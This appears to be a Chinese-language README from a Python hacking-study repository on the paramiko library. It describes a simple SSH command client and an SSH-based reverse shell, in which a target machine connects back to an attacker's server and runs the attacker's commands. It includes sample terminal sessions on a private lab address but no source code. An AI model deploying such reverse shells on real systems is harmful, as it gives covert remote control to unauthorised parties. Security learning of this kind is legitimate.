# SSH通信
`pip install paramiko`

`paramiko`基于`pycrypto`开发的第三方库


# ssh_cmd.py ssh命令执行client
## 流程
- `paramiko`编写SSH client
- 连接SSH，执行命令

## Example:
```
Username:ssff
Password: 
Entry server ip:192.168.199.129
Enter port:22
Entry command:whoami
----OUTPUT----
root
```

# ssh 类反弹shell程序
## 攻击机
`ssh_server.py`启动ssh服务，等待靶机连接，向靶机发送命令执行
### Example:
```
┌──(root💀ssff)-[~/python_hacker_study/python_ssh]
└─# python3 ssh_server.py 
[+] Listening for connection ...
[+] Authenticated!
b'ClientConnected'
Enter command:ls
README.md
ssh_cmd.py
ssh_rcmd.py
ssh_server.py
test_rsa.key

Enter command:

```

## 靶机
`ssh_rcmd.py`连接攻击机ssh服务，接收攻击机命令
### Example:
```
(venv) python_ssh ➤ python3 ssh_rcmd.py                                                                       git:main*
Username:ssr
Password:
Entry server ip:192.168.199.129
Enter port:2222
Welcome to ssh
```
## KEY
`test_rsa.key` 官方github的示例文件